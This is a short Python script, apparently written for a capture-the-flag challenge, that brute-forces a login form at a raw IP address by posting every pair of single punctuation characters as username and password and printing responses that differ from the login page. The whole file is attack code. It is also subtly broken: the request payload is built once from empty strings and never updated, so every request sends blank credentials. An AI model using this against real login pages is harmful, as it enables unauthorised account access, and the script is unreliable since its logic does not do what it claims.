import requests
url = "http://206.189.121.131:30184/login"
user_name, passwd =  "", ""
data = {"username":user_name, "password":passwd}
#special_characters = (32–47 / 58–64 / 91–96 / 123–126)
char = ''
chr_num_dict= {32:47, 58:64, 91:96, 123:126}
for start in chr_num_dict.keys():
	for j in range(start, chr_num_dict[start]+1):
		char+=chr(j)

for uname_chr in char:	
	user_name = uname_chr

	for passwd_chr in char:		
		passwd = passwd_chr
		r = requests.post(url, data=data)

		if (r.status_code != 500) and ("Please login" not in r.text):
			print(f"STATUS_CODE = {r.status_code}   ||  USERNAME = {user_name} | PASSWORD = {passwd}")
			
		elif (r.status_code != 404) or ("Please login" in r.text):			
			#print(f"TEST >>> STATUS_CODE = {r.status_code}   ||  USERNAME = {user_name} | PASSWORD = {passwd}") # For testing purpose
			continue
